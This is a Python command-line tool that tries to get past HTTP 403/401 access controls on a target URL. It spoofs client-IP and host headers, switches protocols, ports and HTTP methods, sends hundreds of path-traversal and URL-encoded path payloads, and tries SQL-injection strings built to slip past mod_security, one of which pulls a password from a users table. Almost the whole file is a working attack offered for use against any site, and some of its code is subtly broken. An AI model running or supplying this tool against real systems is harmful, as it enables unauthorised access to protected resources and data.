import requests
import sys
import argparse

class Colors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    CYAN = '\033[96m'
    LT_CYAN = '\033[94m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    END = '\033[0m'

###----------------------------------------------------------------

def usage():
    print("Usage : \n")
    print("\t403-bypass [URL]\n")
    print("\t-u, --url \t\t target Domain\n")
    print("Bypass Modes: \n")
    print("\t --header \t\t Header Bypass\n")
    print("\t --protocol \t\t Protocol Bypass\n")
    print("\t --port \t\t Port Bypass\n")
    print("\t --HTTPmethod \t\t HTTP Method Bypass\n")
    print("\t --encode \t\t URL Encode Bypass\n")
    print("\t --SQLi \t\t Mod_security & libinjection Bypass\n")
    print("\nALL BYPASSES\n")
    print("\t --exploit \t\t Complete Scan : 403/401 bypass modes\n")
    print(f"{Colors.RED}\tRED\t: \t\t 4xx Status Code\n")
    print(f"{Colors.YELLOW}\tYELLOW\t: \t\t 3xx Status Code\n")
    print(f"{Colors.GREEN}\tGREEN\t: \t\t 2xx Status Code\n")
    print(f"{Colors.BLUE}\tBLUE\t: \t\t 5xx Status Code\n{Colors.END}")

###----------------------------------------------------------------

def banner():
    print(f"\t\t{Colors.CYAN}==========================={Colors.END}")
    print(f"\t\t{Colors.CYAN}|| \t\t\t ||")
    print(f"\t\t{Colors.CYAN}||\t403-bypasser\t ||{Colors.END}")
    print(f"\t\t{Colors.CYAN}|| \t\t\t ||")
    print(f"\t\t{Colors.CYAN}==========================={Colors.END}")
    print(f"\t\t{Colors.YELLOW}- GitHub - github.com/mahaveer-choudhary\n{Colors.END}")

###----------------------------------------------------------------

def print_status(header_name, code, length, payload=None):
    # Print formatted output for each header
    if code.startswith('2'):
        status_color = Colors.GREEN
        status_icon = "[✔]"
    elif code.startswith('3'):
        status_color = Colors.YELLOW
        status_icon = "[✘]"
    elif code.startswith('4'):
        status_color = Colors.YELLOW
        status_icon = "[✘]"
    else:
        status_color = Colors.RED
        status_icon = "[✘]"

    # Output the formatted result
    # header_width = 40  # Width for the header name
    print(
        f"{Colors.CYAN}{header_name} Payload: {status_color}Status: {status_color}{code}{Colors.END}, {Colors.CYAN}Length: {length}{Colors.END}"
        )
    
    # If the status is 200, print the payload in a bordered format
    if code.startswith('2') and payload:
        print(f"╭{'─' * 115}╮")
        print(f"{Colors.MAGENTA} ╰─> PAYLOAD{Colors.END} : {Colors.GREEN}{payload}{Colors.END}")
        print(f"╰{'─' * 115}╯")


def header_bypass(target):
    headers_list = [
        ("X-Originally-Forwarded-For", "127.0.0.1, 68.180.194.242"),
        ("X-Originating-", "127.0.0.1, 68.180.194.242"),
        ("X-Originating-IP", "127.0.0.1, 68.180.194.242"),
        ("True-Client-IP", "127.0.0.1, 68.180.194.242"),
        ("X-WAP-Profile", "127.0.0.1, 68.180.194.242"),
        ("From", "127.0.0.1, 68.180.194.242"),
        ("Profile", "http://{target}"),
        ("X-Arbitrary", "http://{target}"),
        ("X-HTTP-DestinationURL", "http://{target}"),
        ("X-Forwarded-Proto", "http://{target}"),
        ("Destination", "127.0.0.1, 68.180.194.242"),
        ("Proxy", "127.0.0.1, 68.180.194.242"),
        ("CF-Connecting_IP", "127.0.0.1, 68.180.194.242"),
        ("CF-Connecting-IP", "127.0.0.1, 68.180.194.242"),
        ("Referer", target),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Custom-IP-Authorization..;/", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Remote-IP", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("X-Host", "127.0.0.1"),
        ("X-Forwarded-Host", "127.0.0.1"),
        ("X-Original-URL", "/anything"),
        # ("X-Rewrite-URL", ),
        ("Content-Length", "0"),
        ("X-ProxyUser-Ip", "127.0.0.1"),
        ("Base-Url", "127.0.0.1"),
        ("Client-IP", "127.0.0.1"),
        ("Http-Url", "127.0.0.1"),
        ("Proxy-Host", "127.0.0.1"),
        ("Proxy-Url", "127.0.0.1"),
        ("Real-Ip", "127.0.0.1"),
        ("Redirect", "127.0.0.1"),
        ("Referrer", "127.0.0.1"),
        ("Request-Uri", "127.0.0.1"),
        ("Uri", "127.0.0.1"),
        ("Url", "127.0.0.1"),
        ("X-Forward-For", "127.0.0.1"),
        ("X-Forwarded-By", "127.0.0.1"),
        ("X-Forwarded-For-Original", "127.0.0.1"),
        ("X-Forwarded-Server", "127.0.0.1"),
        ("X-Forwarded", "127.0.0.1"),
        ("X-Forwarder-For", "127.0.0.1"),
        ("X-Http-Destinationurl", "127.0.0.1"),
        ("X-Http-Host-Override", "127.0.0.1"),
        ("X-Original-Remote-Addr", "127.0.0.1"),
        ("X-Proxy-Url", "127.0.0.1"),
        ("X-Real-Ip", "127.0.0.1"),
        ("X-Remote-Addr", "127.0.0.1"),
        ("X-OReferrer", "https%3A%2F%2Fwww.google.com%2F"),
    ]

    # Print header bypass section title
    print()
    print()
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")
    print(f"{Colors.LT_CYAN}[+] HTTP Header Bypass{Colors.END}")
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")

    for header_name, header_value in headers_list:
        try:
            response = requests.get(target, headers={header_name: header_value})
            code = str(response.status_code)
            length = len(response.content)
            # Print the status and payload information
            payload = f"curl -ks -H '{header_name}: {header_value}' -X GET '{target}'"
            print_status(header_name, code, length)

        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}Error with {header_name}: {e}{Colors.END}")

def protocol_bypass(target): 
    # Print protocol bypass section title
    print()
    print()
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")
    print(f"{Colors.LT_CYAN}[+] protocol Bypass{Colors.END}")
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")

    domain = target.split('/')[2]
    path = '/'.join(target.split('/')[:3])

    tests = [
        ("http", f"http://{domain}/{path}"),
        ("https", f"https://{domain}/{path}"),
        ("X-Forwarded-Scheme: http", target, "X-Forwarded-Scheme: http"),
        ("X-Forwarded-Scheme: https", target, "X-Forwarded-Scheme: https"),
    ]

    for test in tests: 
        scheme = test[0]
        url = test[1]
        headers = {}
        if len(test) > 4 : 
            headers[test[2]] = test[3]

        try : 
            response = requests.get(url, headers=headers)
            code = str(response.status_code)
            length = len(response.content)

            ## payload information
            if headers : 
                header_name, header_value = list(headers.item())[0]
                payload = f"curl -ks -H '{header_name}: {header_value}' -X GET '{url}'"
            else : 
                payload = f"curl -ks -X GET '{url}'"
            
            print_status(scheme.split(":")[0],code, length)
            
        except requests.exceptions.RequestException as e: 
            print(f"{Colors.RED}Error with {scheme}: {e}{Colors.END}")

###----------------------------------------------------------------

def port_bypass(target) : 
    # Print protocol bypass section title
    print()
    print()
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")
    print(f"{Colors.LT_CYAN}[+] Port Based Bypass{Colors.END}")
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")

    domain = target.split('/')[2]
    path = '/'.join(target.split('/')[3:]) if len(target.split('/')) > 3 else ''

    ports_to_test = [443, 4443, 80, 8080, 8443]

    for port in ports_to_test : 
        try : 
            url = f"http://{domain}/{path}"
            headers = {"X-Forwarded-Port" : str(port)}
            response = requests.get(url, headers=headers)
            code = str(response.status_code)
            length = len(response.content)

            ## prnt the payload information
            payload = f"curl -ks -H 'X-Forwarded-Port: {port}' -X GET '{url}'"
            print_status(f"X-Forwarded-Port {port}", code, length, payload)
        
        except requests.exceptions.RequestException as e: 
            print(f"{Colors.RED}Error with X-Forwarded-Port {port}: {e}{Colors.END}")

###----------------------------------------------------------------

def http_method_bypass(target): 
    # Print protocol bypass section title
    print()
    print()
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")
    print(f"{Colors.LT_CYAN}[+] HTTP Method Bypass{Colors.END}")
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")

    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"

    methods = [
        ("GET", target),
        ("POST", target),
        ("HEAD", target),
        ("OPTIONS", target),
        ("PUT", target),
        ("TRACE", target),
        ("PATCH", target),
        ("CONNECT", target),
        ("UPDATE", target),
        ("LOCK", target),
    ]
    for method_name, url in methods : 
        try : 
            # response = requests.request(method_name, url, headers={"User-Agent", user_agent})
            response = requests.request(method_name, url, headers={"User-Agent": user_agent})

            code = str(response.status_code)
            length = len(response.content)

            payload = f"curl -ks -X {method_name} '{url}' -H 'User-Agent: {user_agent}'"

            print_status(method_name, code, length, payload)
        
        except requests.exceptions.RequestException as e: 
            print(f"{Colors.RED}Error with {method_name}: {e}{Colors.END}")

###----------------------------------------------------------------

def url_encode_bypass(target): 
    # Print protocol bypass section title
    print()
    print()
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")
    print(f"{Colors.LT_CYAN}[+] URL ENCODE Bypass{Colors.END}")
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")

    payloads = [    
        "#?",
        "#?",
        "%09",
        "%%%%09",
        "%09%3b",
        "%%%%09%%%%3b",
        "%09..",
        "%%%%09..",
        "%09;",
        "%%%%09;",
        "%20",
        "%%%%20",
        "%23%3f",
        "%%%%23%%%%3f",
        "%252f%252f",
        "%%%%252f%%%%252f",
        "%252f/",
        "%%%%252f/",
        "%2e%2e",
        "%%%%2e%%%%2e",
        "%2e%2e/",
        "%%%%2e%%%%2e/",
        "%2f",
        "%%%%2f",
        "%2f%20%23",
        "%%%%2f%%%%20%%%%23",
        "%2f%23",
        "%%%%2f%%%%23",
        "%2f%2f",
        "%%%%2f%%%%2f",
        "%2f%3b%2f",
        "%%%%2f%%%%3b%%%%2f",
        "%2f%3b%2f%2f",
        "%%%%2f%%%%3b%%%%2f%%%%2f",
        "%2f%3f",
        "%%%%2f%%%%3f",
        "%2f%3f/",
        "%%%%2f%%%%3f/",
        "%2f/",
        "%%%%2f/",
        "%3b",
        "%%%%3b",
        "%3b%09",
        "%%%%3b%%%%09",
        "%3b%2f%2e%2e",
        "%%%%3b%%%%2f%%%%2e%%%%2e",
        "%3b%2f%2e%2e%2f%2e%2e%2f%2f",
        "%%%%3b%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f",
        "%3b%2f%2e.",
        "%%%%3b%%%%2f%%%%2e.",
        "%3b%2f..",
        "%%%%3b%%%%2f..",
        "%3b/%2e%2e/..%2f%2f",
        "%%%%3b/%%%%2e%%%%2e/..%%%%2f%%%%2f",
        "%3b/%2e.",
        "%%%%3b/%%%%2e.",
        "%3b/%2f%2f../",
        "%%%%3b/%%%%2f%%%%2f../",
        "%3b/..",
        "%%%%3b/..",
        "%3b//%2f../",
        "%%%%3b//%%%%2f../",
        "%3f%23",
        "%%%%3f%%%%23",
        "%3f%3f",
        "%%%%3f%%%%3f",
        "..",
        "..",
        "..%00/;",
        "..%%%%00/;",
        "..%00;/",
        "..%%%%00;/",
        "..%09",
        "..%%%%09",
        "..%0d/;",
        "..%%%%0d/;",
        "..%0d;/",
        "..%%%%0d;/",
        "..%5c/",
        "..%%%%5c/",
        "..%ff/;",
        "..%%%%ff/;",
        "..%ff;/",
        "..%%%%ff;/",
        "..;%00/",
        "..;%%%%00/",
        "..;%0d/",
        "..;%%%%0d/",
        "..;%ff/",
        "..;%%%%ff/",
        "/%20#",
        "/%%%%20#",
        "/%20%23",
        "/%%%%20%%%%23",
        "/%252e%252e%252f/",
        "/%%%%252e%%%%252e%%%%252f/",
        "/%252e%252e%253b/",
        "/%%%%252e%%%%252e%%%%253b/",
        "/%252e%252f/",
        "/%%%%252e%%%%252f/",
        "/%252e%253b/",
        "/%%%%252e%%%%253b/",
        "/%252e/",
        "/%%%%252e/",
        "/%252f",
        "/%%%%252f",
        "/%2e%2e",
        "/%%%%2e%%%%2e",
        "/%2e%2e%3b/",
        "/%%%%2e%%%%2e%%%%3b/",
        "/%2e%2e/",
        "/%%%%2e%%%%2e/",
        "/%2e%2f/",
        "/%%%%2e%%%%2f/",
        "/%2e%3b/",
        "/%%%%2e%%%%3b/",
        "/%2e%3b//",
        "/%%%%2e%%%%3b//",
        "/%2e/",
        "/%%%%2e/",
        "/%2e//",
        "/%%%%2e//",
        "/%2f",
        "/%%%%2f",
        "/%3b/",
        "/%%%%3b/",
        "/..",
        "/..",
        "/..%2f",
        "/..%%%%2f",
        "/..%2f..%2f",
        "/..%%%%2f..%%%%2f",
        "/..%2f..%2f..%2f",
        "/..%%%%2f..%%%%2f..%%%%2f",
        "/../",
        "/../",
        "/../../",
        "/../../",
        "/../../../",
        "/../../../",
        "/../../..//",
        "/../../..//",
        "/../..//",
        "/../..//",
        "/../..//../",
        "/../..//../",
        "/../..;/",
        "/../..;/",
        "/.././../",
        "/.././../",
        "/../.;/../",
        "/../.;/../",
        "/..//",
        "/..//",
        "/..//../",
        "/..//../",
        "/..//../../",
        "/..//../../",
        "/..//..;/",
        "/..//..;/",
        "/../;/",
        "/../;/",
        "/../;/../",
        "/../;/../",
        "/..;%2f",
        "/..;%%%%2f",
        "/..;%2f..;%2f",
        "/..;%%%%2f..;%%%%2f",
        "/..;%2f..;%2f..;%2f",
        "/..;%%%%2f..;%%%%2f..;%%%%2f",
        "/..;/../",
        "/..;/../",
        "/..;/..;/",
        "/..;/..;/",
        "/..;//",
        "/..;//",
        "/..;//../",
        "/..;//../",
        "/..;//..;/",
        "/..;//..;/",
        "/..;/;/",
        "/..;/;/",
        "/..;/;/..;/",
        "/..;/;/..;/",
        "/.//",
        "/.//",
        "/.;/",
        "/.;/",
        "/.;//",
        "/.;//",
        "//..",
        "//..",
        "//../../",
        "//../../",
        "//..;",
        "//..;",
        "//./",
        "//./",
        "//.;/",
        "//.;/",
        "///..",
        "///..",
        "///../",
        "///../",
        "///..//",
        "///..//",
        "///..;",
        "///..;",
        "///..;/",
        "///..;/",
        "///..;//",
        "///..;//",
        "//;/",
        "//;/",
        "/;/",
        "/;/",
        "/;//",
        "/;//",
        "/;x",
        "/;x",
        "/;x/",
        "/;x/",
        "/x/../",
        "/x/../",
        "/x/..//",
        "/x/..//",
        "/x/../;/",
        "/x/../;/",
        "/x/..;/",
        "/x/..;/",
        "/x/..;//",
        "/x/..;//",
        "/x/..;/;/",
        "/x/..;/;/",
        "/x//../",
        "/x//../",
        "/x//..;/",
        "/x//..;/",
        "/x/;/../",
        "/x/;/../",
        "/x/;/..;/",
        "/x/;/..;/",
        ";",
        ";",
        ";%09",
        ";%%%%09",
        ";%09..",
        ";%%%%09..",
        ";%09..;",
        ";%%%%09..;",
        ";%09;",
        ";%%%%09;",
        ";%2F..",
        ";%%%%2F..",
        ";%2f%2e%2e",
        ";%%%%2f%%%%2e%%%%2e",
        ";%2f%2e%2e%2f%2e%2e%2f%2f",
        ";%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f",
        ";%2f%2f/../",
        ";%%%%2f%%%%2f/../",
        ";%2f..",
        ";%%%%2f..",
        ";%2f..%2f%2e%2e%2f%2f",
        ";%%%%2f..%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f",
        ";%2f..%2f..%2f%2f",
        ";%%%%2f..%%%%2f..%%%%2f%%%%2f",
        ";%2f..%2f/",
        ";%%%%2f..%%%%2f/",
        ";%2f..%2f/..%2f",
        ";%%%%2f..%%%%2f/..%%%%2f",
        ";%2f..%2f/../",
        ";%%%%2f..%%%%2f/../",
        ";%2f../%2f..%2f",
        ";%%%%2f../%%%%2f..%%%%2f",
        ";%2f../%2f../",
        ";%%%%2f../%%%%2f../",
        ";%2f..//..%2f",
        ";%%%%2f..//..%%%%2f",
        ";%2f..//../",
        ";%%%%2f..//../",
        ";%2f..///",
        ";%%%%2f..///",
        ";%2f..///;",
        ";%%%%2f..///;",
        ";%2f..//;/",
        ";%%%%2f..//;/",
        ";%2f..//;/;",
        ";%%%%2f..//;/;",
        ";%2f../;//",
        ";%%%%2f../;//",
        ";%2f../;/;/",
        ";%%%%2f../;/;/",
        ";%2f../;/;/;",
        ";%%%%2f../;/;/;",
        ";%2f..;///",
        ";%%%%2f..;///",
        ";%2f..;//;/",
        ";%%%%2f..;//;/",
        ";%2f..;/;//",
        ";%%%%2f..;/;//",
        ";%2f/%2f../",
        ";%%%%2f/%%%%2f../",
        ";%2f//..%2f",
        ";%%%%2f//..%%%%2f",
        ";%2f//../",
        ";%%%%2f//../",
        ";%2f//..;/",
        ";%%%%2f//..;/",
        ";%2f/;/../",
        ";%%%%2f/;/../",
        ";%2f/;/..;/",
        ";%%%%2f/;/..;/",
        ";%2f;//../",
        ";%%%%2f;//../",
        ";%2f;/;/..;/",
        ";%%%%2f;/;/..;/",
        ";/%2e%2e",
        ";/%%%%2e%%%%2e",
        ";/%2e%2e%2f%2f",
        ";/%%%%2e%%%%2e%%%%2f%%%%2f",
        ";/%2e%2e%2f/",
        ";/%%%%2e%%%%2e%%%%2f/",
        ";/%2e%2e/",
        ";/%%%%2e%%%%2e/",
        ";/%2e.",
        ";/%%%%2e.",
        ";/%2f%2f../",
        ";/%%%%2f%%%%2f../",
        ";/%2f/..%2f",
        ";/%%%%2f/..%%%%2f",
        ";/%2f/../",
        ";/%%%%2f/../",
        ";/.%2e",
        ";/.%%%%2e",
        ";/.%2e/%2e%2e/%2f",
        ";/.%%%%2e/%%%%2e%%%%2e/%%%%2f",
        ";/..",
        ";/..",
        ";/..%2f",
        ";/..%%%%2f",
        ";/..%2f%2f../",
        ";/..%%%%2f%%%%2f../",
        ";/..%2f..%2f",
        ";/..%%%%2f..%%%%2f",
        ";/..%2f/",
        ";/..%%%%2f/",
        ";/..%2f//",
        ";/..%%%%2f//",
        ";/../",
        ";/../",
        ";/../%2f/",
        ";/../%%%%2f/",
        ";/../../",
        ";/../../",
        ";/../..//",
        ";/../..//",
        ";/.././../",
        ";/.././../",
        ";/../.;/../",
        ";/../.;/../",
        ";/..//",
        ";/..//",
        ";/..//%2e%2e/",
        ";/..//%%%%2e%%%%2e/",
        ";/..//%2f",
        ";/..//%%%%2f",
        ";/..//../",
        ";/..//../",
        ";/..///",
        ";/..///",
        ";/../;/",
        ";/../;/",
        ";/../;/../",
        ";/../;/../",
        ";/..;",
        ";/..;",
        ";/.;.",
        ";/.;.",
        ";//%2f../",
        ";//%%%%2f../",
        ";//..",
        ";//..",
        ";//../../",
        ";//../../",
        ";///..",
        ";///..",
        ";///../",
        ";///../",
        ";///..//",
        ";///..//",
        ";x",
        ";x",
        ";x/",
        ";x/",
        ";x;",
        ";x;",
        "&",
        "&",
        "%",
        "%%%%",
        "%09",
        "%%%%09",
        "../",
        "../",
        "..%2f",
        "..%%%%2f",
        ".././",
        ".././",
        "..%00/",
        "..%%%%00/",
        "..%0d/",
        "..%%%%0d/",
        "..%5c",
        "..%%%%5c",
        "..%ff",
        "..%%%%ff",
        "%2e%2e%2f",
        "%%%%2e%%%%2e%%%%2f",
        ".%2e/",
        ".%%%%2e/",
        "%3f",
        "%%%%3f",
        "%26",
        "%%%%26",
        "%23",
        "%%%%23",
        "%2e",
        "%%%%2e",
        "/.",
        "/.",
        "?",
        "?",
        "??",
        "??",
        "???",
        "???",
        "//",
        "//",
        "/./",
        "/./",
        ".//./",
        ".//./",
        "//?anything",
        "//?anything",
        "#",
        "#",
        "/",
        "/",
        "/.randomstring",
        "/.randomstring",
        "..;/",
        "..;/",
        ".html",
        ".html",
        "%20/",
        "%%%%20/",
        "/%20%20/",
        "/%%%%20%%%%20/",
        ".json",
        ".json",
        "/*",
        "/*",
        "./.",
        "./.",
        "/*/",
        "/*/",
        "/..;/",
        "/..;/",
        "/%2e/",
        "/%%%%2e/",
        "/%2e/",
        "/%%%%2e/",
        "//.",
        "//.",
        "////",
        "////",
        "/../",
        "/../",
        "/;/",
        "/;/",

    ]

    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"

    for payload in payloads : 
        url = f"{target}{payload}"

        try : 
            response = requests.get(url, headers={"User-Agent": user_agent}, verify=True)
            code = str(response.status_code)
            length = len(response.content)

            curl_payload = f"curl -k -s '{url}' -H 'User-Agent: {user_agent}'"
            print_status(payload, code, length, curl_payload if code == "200" else None)

        except requests.RequestException as e : 
            print(f"{Colors.RED}Error with payload [{payload}]: {e}{Colors.END}")

###----------------------------------------------------------------

def sqli_injection_bypass(target): 
    # Print protocol bypass section title
    print()
    print()
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")
    print(f"{Colors.LT_CYAN}[+] SQLi Based Bypass{Colors.END}")
    print(f"{Colors.LT_CYAN}-----------------------{Colors.END}")

    payloads = [
        "' or 1.e(\")='",
        "1.e(ascii",
        "1.e(substring(",
        "1.e(ascii 1.e(substring(1.e(select password from users limit 1,1),1),1) = 70 or'1'='2"
    ]

    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"

    for payload in payloads : 
        url = f"{target}/{payload}"

        try : 
            response = requests.get(url, headers={"User-Agent":user_agent})
            code = str(response.status_code)
            length = len(response.content)

            curl_payload = f"curl -k -s '{url}' -H 'User-Agent: {user_agent}'"

            print_status(payload, code, length, curl_payload if code == '200' else None)

        except requests.RequestException as e: 
            print(f"{Colors.RED}Error with payload [{payload}]: {e}{Colors.END}")
    
###----------------------------------------------------------------

def bypass_403(target): 
    print(f"{Colors.MAGENTA}Running all bypasses for {target}{Colors.END}")
    header_bypass(target)
    protocol_bypass(target)
    port_bypass(target)
    http_method_bypass(target)
    url_encode_bypass(target)
    sqli_injection_bypass(target)

def arguments(): 
    parser = argparse.ArgumentParser(description='403 Bypass Tool')
    parser.add_argument('-u', '--url', type=str, help='Target URL', required=True)
    parser.add_argument('--header', action='store_true', help='Header Bypass')
    parser.add_argument('--protocol', action='store_true', help='Protocol Bypass')
    parser.add_argument('--port', action='store_true', help='Port Bypass')
    parser.add_argument('--HTTPmethod', action='store_true', help='HTTP Method Bypass')
    parser.add_argument('--encode', action='store_true', help='URL Encode Bypass')
    parser.add_argument('--SQLi', action='store_true', help='SQLi injection Bypass')
    parser.add_argument('--exploit', action='store_true', help='Run all Bypasses')

    args = parser.parse_args()

    if not args.url: 
        print(f"{Colors.RED}Error {Colors.END}No URL is provided. Exiting..")
        usage()
        sys.exit(1)

    target = args.url
    # Check if the URL has a scheme (http or https)
    if not target.startswith(('http://', 'https://')):
       target = 'https://' + target

    ## checking for bypass type
    if args.header: 
        banner()
        # print("Running Header Bypass...")
        print(f"{Colors.MAGENTA}Running Header Bypass for {target}{Colors.END}")
        header_bypass(target)

    elif args.protocol : 
        banner()
        # print("Running Protocol Bypass...")
        print(f"{Colors.MAGENTA}Running Protocol Bypass for {target}{Colors.END}")
        protocol_bypass(target)

    elif args.port:
        banner()
        # print("Running Port Bypass...")
        print(f"{Colors.MAGENTA}Running Port Bypass for {target}{Colors.END}")
        port_bypass(target)
    
    elif args.HTTPmethod: 
        banner()
        # print("Running HTTP Method Bypass...")
        print(f"{Colors.MAGENTA}Running HTTP Method Bypass for {target}{Colors.END}")
        http_method_bypass(target)

    elif args.encode : 
        banner()
        # print("Running URL Encode Bypass...")
        print(f"{Colors.MAGENTA}Running URL Encode Bypass for {target}{Colors.END}")
        url_encode_bypass(target)

    elif args.SQLi:
        banner()
        # print("Running SQLi injection Bypass...")
        print(f"{Colors.MAGENTA}Running SQLi injection Bypass for {target}{Colors.END}")
        sqli_injection_bypass(target)

    elif args.exploit:
        banner()
        # print("Running all Bypassess...")
        bypass_403(target)

    else : 
        usage()
        print(f"{Colors.RED}Error{Colors.END} No mode selected. Exiting...")
        sys.exit(1)
###----------------------------------------------------------------

if __name__ == "__main__":
    try : 
        if len(sys.argv) < 3 or sys.argv[1] not in ['--url', '-u']:
            usage()
            sys.exit(1)

        target = sys.argv[2]

        arguments()
    except KeyboardInterrupt : 
        print(f"\n{Colors.RED}Process interrupted by user. Exiting...{Colors.END}")
        sys.exit(0)

###--------------------code complete------------------------------